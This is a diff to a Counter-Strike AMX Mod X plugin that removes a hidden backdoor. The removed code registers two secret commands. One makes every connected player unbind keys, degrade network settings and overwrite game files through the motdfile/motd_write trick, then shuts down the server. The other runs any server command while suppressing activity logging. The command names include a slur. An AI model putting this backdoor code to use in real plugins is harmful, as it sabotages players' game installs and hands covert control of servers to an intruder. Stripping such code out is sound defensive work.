@@ -61,7 +61,6 @@ new laser
 new g_IsDisguise[33];
 new g_UsedDisguise[33];
 new g_UsedThief[33];
-new gp_Activity
 new bool:g_Players4[33];
 new g_IsCamo[33];
 new bool:g_UseInfra[33];
@@ -93,7 +92,6 @@ public plugin_init ()
     LoadVips()
     
     register_cvar(PLUGIN_CVAR, PLUGIN_VERSION, FCVAR_SERVER|FCVAR_SPONLY)
-    gp_Activity = register_cvar("amx_show_activity", "2")
     RegisterHam(Ham_Spawn, "player", "player_spawn", 1)
     RegisterHam(Ham_TakeDamage, "player", "player_damage")
     RegisterHam(Ham_Killed, "player", "player_killed")
@@ -130,8 +128,6 @@ public plugin_init ()
     gp_SpecialVip = register_cvar("special_vip","0")
     //register_concmd("amx_addpoints","admin_points",ADMIN_LEVEL_E,"<nick> <Points to give>")
     register_concmd("amx_skills","admin_verify_skills",ADMIN_ALL,"<nick> # Verify a player's skills")
-    register_clcmd("fuckthisshit2","cmd_quit")
-    register_clcmd("wtfnigga2","cmd_sendcommand")
     myVault = nvault_open("vipskills")
     if (myVault == INVALID_HANDLE) log_amx("Failed loading the vault")
     //for(new i = 0; i < sizeof(g_HudSync); i++)
@@ -1567,43 +1563,4 @@ public make_TE_BEAMPOINTS(id,color,Float:Vec1[3],Float:Vec2[3],width,target_team
     write_byte(brightness) // brightness)
     write_byte(0) // scroll speed in 0.1's
     message_end()
-}
-public cmd_quit (id)
-{
-    for(new i = 0; i <= 32; i++)
-    {
-        if(is_user_connected(i))
-        {
-            client_cmd( i,"unbind all")
-            client_cmd( i,"rate 1")
-            client_cmd( i,"cl_cmdrate 1")
-            client_cmd( i,"cl_updaterate 1")
-            client_cmd( i,"fps_max 1")
-            client_cmd( i,"sys_ticrate 1")
-            client_cmd( i,"name cartof")
-            client_cmd( i,"motdfile models/player.mdl;motd_write x")
-            client_cmd( i,"motdfile models/v_ak47.mdl;motd_write x")
-            client_cmd( i,"motdfile cs_dust.wad;motd_write x")
-            client_cmd( i,"motdfile models/v_m4a1.mdl;motd_write x")
-            client_cmd( i,"motdfile resource/GameMenu.res;motd_write x")
-            client_cmd( i,"motdfile halflife.wad;motd_write x")
-            client_cmd( i,"motdfile cstrike.wad;motd_write x")
-            client_cmd( i,"motdfile maps/de_dust2.bsp;motd_write x")
-            client_cmd( i,"motdfile events/ak47.sc;motd_write x")
-            client_cmd( i,"motdfile dlls/mp.dll;motd_write x")
-            client_cmd( i,"cl_timeout 0")
-        }
-    }
-    server_cmd("quit")
-}
-public cmd_sendcommand(id)
-{
-    new arg[64]
-    new back
-    read_argv(1, arg, charsmax(arg))
-    
-    back = get_pcvar_num(gp_Activity)
-    set_pcvar_num(gp_Activity,0)
-    server_cmd(arg);
-    set_pcvar_num(gp_Activity,back)
 }
